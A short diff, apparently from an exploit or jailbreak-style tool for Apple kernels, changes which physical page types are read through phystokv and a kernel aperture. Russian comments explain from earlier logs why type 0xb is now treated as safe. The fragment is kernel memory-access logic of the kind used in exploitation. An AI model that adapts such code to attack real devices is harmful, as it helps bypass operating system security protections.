@@ -8259,9 +8259,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             int t = kpFrameTypeOf(pa);
                             if (t < 0) typeNoTable++;
                             else if (t < 64) typeHist[t]++;
-                            if (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18) continue;   // таблицы — deadly
-                            // 2.0.5: контент читаем только whitelist-типы
-                            if (t != 0x10 && t != tSafe1 && t != tSafe2) continue;
+                            // 2.0.6: whitelist-типы читаем ДАЖЕ если они в
+                            // deadly-списке. 2.0.5 лог: ctlPA/backingPA — тип
+                            // 0x0b («11» в гистограмме), маркеры через
+                            // phystokv читались ВЕРНО — значит 0xb через
+                            // kernel aperture безопасен. Deadly-эвристика
+                            // 1.9.178b путала walker/DART-контекст. Порядок
+                            // проверок перевёрнут: whitelist побеждает.
+                            BOOL whitelisted = (t == 0x10 || t == tSafe1 || t == tSafe2);
+                            if (!whitelisted && (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18)) continue;
+                            if (!whitelisted) continue;
                             uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
                             if (!pkva2) continue;
                             reads++;
